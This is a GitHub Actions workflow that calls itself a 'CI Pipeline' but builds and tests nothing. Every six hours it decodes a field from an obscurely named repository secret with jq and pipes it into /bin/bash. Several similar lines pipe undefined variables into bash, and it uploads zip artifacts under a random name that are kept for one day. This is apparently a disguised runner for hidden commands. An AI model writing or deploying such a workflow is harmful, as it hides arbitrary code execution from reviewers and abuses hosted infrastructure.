name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '53 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          spgk593: ${{ secrets.spgk593 }}
        run: |
          printf '%s' "$spgk593" | jq -r .lfgj01 | /bin/bash
          echo $bdc1 | jq -r .xeoae91654 | /bin/bash
          echo $k19131 | jq -r .hfdx83 | /bin/bash
          echo $ftyvk78 | jq -r .ko4 | /bin/bash
          echo $g16114 | jq -r .wwhn50 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: mZSnaHlS
          path: "*.zip"
          retention-days: 1
